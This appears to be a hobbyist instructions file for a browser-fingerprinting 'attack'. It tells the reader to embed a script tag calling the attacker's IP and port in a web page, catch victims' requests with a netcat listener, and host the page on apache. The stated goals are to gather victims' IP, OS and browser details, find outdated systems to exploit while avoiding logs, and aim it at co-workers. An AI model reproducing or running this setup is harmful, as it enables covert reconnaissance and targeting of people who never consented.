#hey you, yeah you!! PLEASE..... Don't use this for Malicious Purpose's, and if you do, I'm not liable for anything that may happen!!

#REMEMBER HACKING IS ILLEGAL!!!!!!!!!!!!!!
 
#NOTE, THIS ATTACK WILL ONLY WORK IF YOU ARE ON THE SAME NETWORK AS THE VICTIM!!!!!!! YOU CAN MAKE IT ACCESSIBLE TO PEOPLE OUTSIDE THE YOUR NETWORK -
#BUT IS NOT RECCONMENDED FOR SECURITY REASONS!!!!!!!!!!!

#THIS ATTACK WILL GIVE YOU THE VICTIMS IP ADDRESS, OS VERSION, BROWSER VERSION AND INCLUDING CPU STATS!!!!!!!!!

#THIS ATTACK IS GOOD FOR FINDING OUTDATED SYSTEMS AND BROWSERS TO EXPLOIT WITHOUT SCANNING THE VICTIMS COMPUTER OR NETWORK.....

#add this script to the /var/www/html directory before running 

#NOTE!!!!! IN THE index.html file, YOU CAN CHANGE THE IMAGE DISPLAYED....

#1.In order to use this you are going to have to change the Ip address in the html script to your  or the Attacker IP address,

#2. Also you will change the port number acording to the port "you" or the "Attacker" is listening from,

#Here's an example.... 

<script "http://Your Ip Address:Port Number/ " > </script>

#After you finish editing the index.html file, you will need to have "Netcat" installed, depending on your system, research how to install it. 

#after you installed netcat, you are ready to start!!!!!!! 

#Example......

        sudo nc -lnvp portnumber 

#PLEASE the Port Number you edited in the index.html file, use that for the netcat listener,

#after this command, your computer is now listning to anything coming to the port you selected!!!!!!

#Now run this command 


        sudo service apache2 start

#after this you now have a web server running on you machine, I always like checking with a simple nmap scan.


        sudo nmap "your ip address" 

#Running that command will make sure your webserver is actually up, 

#now in your browser window, type the IP address you edited in the index.html file 

#if everything was done right you should now see the Black screen with green words "you have been hacked!!!!!!"

#if you switch back to the terminal where your netcat listner is running, you should now see your exposed system information

#this info is good to know what (OS) or Operating System the victim is runnig without causing suspicious traffick or creating logs on a network  

#With PERMISSION!!!! use this against friends, family, or that annoying CO-Worker :)

# - JOSH
